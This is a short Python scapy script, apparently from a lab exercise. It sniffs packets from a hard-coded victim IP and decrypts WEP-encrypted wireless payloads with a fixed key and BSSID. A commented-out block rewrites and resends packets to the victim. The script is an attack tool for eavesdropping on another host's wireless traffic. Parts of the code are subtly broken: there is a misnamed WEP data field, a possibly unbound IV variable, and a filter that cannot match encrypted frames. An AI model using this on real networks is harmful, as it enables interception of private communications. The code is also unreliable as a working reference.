from scapy.all import sniff, send, PPI_DOT11COMMON
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest
from scapy.layers.dot11 import Dot11, Dot11WEP
import WEP_sniffer


# Define the victim's IP address
victim_ip = "192.168.3.103"
webserver_ip = "192.168.3.102"

# Define network information
bssid = "74:DA:38:EB:6F:DC"
WEP_key = "ESAT2"


def decrypt(packet, bssid, WEP_key):
    iv = iv_catcher(packet, bssid)
    print(iv)
    encrypted_load = WEP_sniffer.decrypt_packet(packet[Dot11WEP].webdata, iv, WEP_key)

    return encrypted_load


def iv_catcher(packet, bssid):
    if packet.haslayer(Dot11WEP):
        iv = packet[Dot11WEP].iv

    return iv


'''def packet_callback(packet):
    pck = packet.copy()

    if packet.haslayer(IP) and packet.haslayer(TCP) and packet[IP].src == victim_ip:
        print(f"Captured packet from {victim_ip} to {packet[IP].dst}")
        packet.show()
        # Modify the packet's destination to the victim's IP
        packet[IP].dst = victim_ip

        # Print decrypted packet load.
        print(decrypt(pck, bssid, WEP_key))

        # Send the modified packet back to the victim
        send(packet)
        print(f"Forwarded packet back to {victim_ip}")'''


def packet_callback(packet):
    print(decrypt(packet, bssid, WEP_key))

# Sniff packets on the network and use packet_callback to process them
sniff(filter=f"ip src {victim_ip}", prn=packet_callback, store=0)

